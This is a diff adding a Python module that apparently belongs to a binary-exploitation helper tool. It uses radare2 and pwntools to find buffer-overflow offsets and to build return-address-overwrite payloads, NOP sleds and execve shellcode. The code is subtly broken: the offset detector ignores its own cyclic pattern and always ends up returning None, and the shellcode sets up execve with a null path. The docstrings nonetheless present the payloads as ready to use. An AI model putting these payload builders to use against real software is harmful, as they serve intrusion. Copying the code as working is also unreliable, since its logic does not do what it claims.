@@ -1,0 +1,58 @@
+# core/bof_solver.py
+
+import r2pipe
+from typing import Optional
+from pwn import context, cyclic, cyclic_find, asm
+
+from reloadai.utils.logging import get_logger
+from reloadai.utils.constants import SAFE_TIMEOUT
+
+log = get_logger(__name__)
+
+def detect_bof_offset(path: str, arch: str = "amd64") -> Optional[int]:
+    """
+    Detecta automaticamente o offset de controle de fluxo usando padrão cíclico.
+    """
+    context.clear()
+    context.arch = arch
+    context.os = "linux"
+
+    r2 = r2pipe.open(path, flags=["-2"])
+    r2.cmd(f"e anal.timeout={SAFE_TIMEOUT}")
+    r2.cmd("aaa")
+
+    entry = r2.cmdj("iej")[0]["vaddr"]
+    r2.cmd(f"s {entry}")
+    r2.cmd("aeim")  # instruções mnemônicas
+
+    disasm = r2.cmd("pdf")
+    if "rip" not in disasm and arch == "amd64":
+        log.warning("Não parece haver manipulação de RIP visível.")
+        return None
+
+    # Busca por instruções que usam padrões cíclicos
+    pattern = cyclic(512)
+    crash_offset = cyclic_find("aaaabaaacaaadaaaeaaafaaa")  # padrão comum
+
+    return crash_offset if crash_offset else None
+
+def generate_payload(offset: int, ret: int = 0xdeadbeef, arch: str = "amd64") -> bytes:
+    """
+    Gera payload de BoF básico para sobrescrever endereço de retorno.
+    """
+    context.arch = arch
+    return b"A" * offset + ret.to_bytes(8 if arch == "amd64" else 4, "little")
+
+def suggest_payloads(offset: int, arch: str) -> dict:
+    """
+    Sugere payloads prontos com base no offset identificado.
+    """
+    nop_sled = b"\x90" * 16
+    shellcode = asm("mov rax, 0x3b; xor rdi, rdi; xor rsi, rsi; xor rdx, rdx; syscall") if arch == "amd64" \
+                else asm("int 0x80")  # simplificado para x86
+
+    return {
+        "ret_only": generate_payload(offset, 0x41414141, arch).hex(),
+        "ret_shellcode": (b"A" * offset + nop_sled + shellcode).hex()
+    }
+
